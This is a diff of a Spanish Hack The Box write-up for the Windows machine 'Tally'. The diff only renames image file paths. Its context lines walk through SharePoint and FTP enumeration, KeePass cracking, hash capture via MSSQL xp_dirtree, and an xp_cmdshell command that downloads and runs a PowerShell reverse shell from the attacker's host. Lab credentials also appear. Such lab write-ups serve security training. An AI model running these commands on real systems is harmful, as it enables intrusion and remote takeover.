@@ -3,7 +3,7 @@ title: "Tally - WriteUp"
 date: Tue Apr 01 2025 17:15:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, powershell, exploit, mssql, mysql, bash, smb, wfuzz]
-image: /assets/img/htb-writeups/Pasted image 20240222190040.png
+image: /assets/img/htb-writeups/Pasted-image-20240222190040.png
 ---
 
 {% include machine-info.html
@@ -13,13 +13,13 @@ image: /assets/img/htb-writeups/Pasted image 20240222190040.png
   platform="HTB"
 %}
 
-![Tally](/assets/img/htb-writeups/Pasted image 20240222190040.png)
+![Tally](/assets/img/htb-writeups/Pasted-image-20240222190040.png)
 
 Tags:             
 
 -----
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240222190040.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240222190040.png)
 
 Tally puede ser una máquina muy desafiante para algunos. Se centra en muchos aspectos diferentes de los entornos reales de Windows y requiere que los usuarios modifiquen y compilen un exploit para escalarlo. En este documento no se cubre el uso de Rotten Potato, que es un método alternativo no intencionado para la escalada de privilegios.
 
@@ -134,7 +134,7 @@ Host script results:
 ```
 
 HTTP
-![TALLY](/assets/img/htb-writeups/Pasted image 20240222203352.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240222203352.png)
 
 Estamos ante un servidor SharePoint. Necesitamos credenciales.
 
@@ -155,9 +155,9 @@ http://10.129.1.183/SitePages/Forms/AllPages.aspx
 
 Nos llama la atención esta ruta y nos bajamos el contenido.
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240222204551.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240222204551.png)
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240222204621.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240222204621.png)
 
 Tenemos una contraseña.
 
@@ -171,11 +171,11 @@ Otras rutas de interés:
 http://10.129.1.183/SitePages/Forms/AllPages.aspx
 ```
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223105336.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223105336.png)
 
 Si hacemos hovering en el enlace de l documento vemos que nos lleva a http://10.129.1.183/SitePages/FinanceTeam.aspx, no pinchemos directamente porque nos redirige a otro sitio.
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223105603.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223105603.png)
 
 Si leemos con atención nos dice que usemos el usuario _ftp_user_
 
@@ -212,13 +212,13 @@ $ curlftpfs 10.129.1.183 /mnt/ftp -o user=ftp_user:'UTDRSCH53c"$6hys'
 
 Encontramos una lista de usuario y sus carpetas, entre otras. Nos los descargamos todos y apuntamos los nombres de usuario.
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223112409.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223112409.png)
 
 Vamos a explorar todos los archivos descargados.
 
 Dentro de la carpeta de _tim_ encontramos una BBDD de _keepass_:
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223113832.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223113832.png)
 
 Vamos a por la BBDD de Keepass:
 
@@ -255,11 +255,11 @@ simplementeyo
 
 Abrimos la BBDD con la contraseña obtenida y vemos lo siguiente:
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223114656.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223114656.png)
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223114715.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223114715.png)
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223114738.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223114738.png)
 
 Apuntamos todo y sobre todo las credenciales:
 
@@ -301,7 +301,7 @@ Tenemos permisos de lectura en la carpeta ACCT, vamos a conectar vía Thunar por
 smb://10.129.1.183/ACCT
 ```
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223120255.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223120255.png)
 
 Podemos hacerlo también montando la unidad compartida con _mount_:
 
@@ -313,7 +313,7 @@ Descubrimos que Tally es un ERP V9
 
 Nos copiamos los archivos que hemos visto más relevantes:
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223122126.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223122126.png)
 
 Vamos a explorar uno por uno.
 
@@ -350,7 +350,7 @@ La contraseña es "Acc0unting"
 
 Lo descomprimimos y visualizamos su contenido.
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223130017.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223130017.png)
 
 Tenemos el password de admin...
 
@@ -362,7 +362,7 @@ También encontramos un binario sospechoso en la ruta "smb://10.129.143.199/acct
 
 Vamos a ver lo que contiene con _strings_:
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223135347.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223135347.png)
 
 Y obtenemos otras credenciales! parece que es del servidor MSSQL. Las apuntamos.
 
@@ -414,7 +414,7 @@ $ sudo impacket-smbserver share ./ -smb2support
 EXEC xp_dirtree '\\10.10.14.131\remote', 1, 1;
 ```
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223141517.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223141517.png)
 
 Pasamos _john_...
 ```bash
@@ -456,13 +456,13 @@ Y por último ejecutaremos el siguiente comando en la consola mssql:
 SQL (sa  dbo@master)> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.131:8000/reverse.ps1") | powershell -noprofile'
 ```
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223144742.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223144742.png)
 
 Y conseguimos entrar...
 
 Registramos la bandera de user sita en el escritorio de Sarah y seguimos.
 
-![TALLY](/assets/img/htb-writeups/Pasted image 20240223145047.png)
+![TALLY](/assets/img/htb-writeups/Pasted-image-20240223145047.png)
 
 ```http
 sarah:mylongandstrongp4ssword!
